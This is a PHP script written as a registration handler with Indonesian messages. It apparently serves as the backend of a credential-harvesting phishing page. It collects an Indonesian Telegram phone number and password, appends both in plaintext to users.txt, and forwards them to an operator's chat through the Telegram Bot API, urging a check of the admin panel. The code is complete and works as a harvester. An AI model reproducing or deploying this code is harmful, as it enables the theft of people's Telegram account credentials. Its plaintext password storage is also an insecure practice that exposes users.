<?php
$bot_token = "YOUR_BOT_TOKEN";
$chat_id = "YOUR_CHAT_ID";

$telegram = $_POST['telegram'];
$password = $_POST['password'];
$referral = $_POST['referral'] ?? "Tidak Ada";

if (!preg_match('/^\+62\d{9,12}$/', $telegram)) {
    die("❌ Nomor Telegram tidak valid!");
}

$user_info = "$telegram | Password: $password | Referral: $referral\n";
file_put_contents("users.txt", $user_info, FILE_APPEND);

$message = "📌 *Pendaftaran Baru!*

" .
           "📱 *Telegram:* `$telegram`
" .
           "🔑 *Password:* `$password`
" .
           "🎟 *Kode Referral:* `$referral`

" .
           "🚀 *Segera Cek Admin Panel!*";

$url = "https://api.telegram.org/bot$bot_token/sendMessage";
$data = [
    "chat_id" => $chat_id,
    "text" => $message,
    "parse_mode" => "Markdown"
];

$options = [
    "http" => [
        "header" => "Content-Type: application/x-www-form-urlencoded\r\n",
        "method" => "POST",
        "content" => http_build_query($data),
    ],
];

$context = stream_context_create($options);
$response = file_get_contents($url, false, $context);

if ($response) {
    echo "✅ Registrasi berhasil! Admin telah menerima notifikasi.";
} else {
    echo "❌ Registrasi berhasil, tapi notifikasi gagal dikirim.";
}
?>
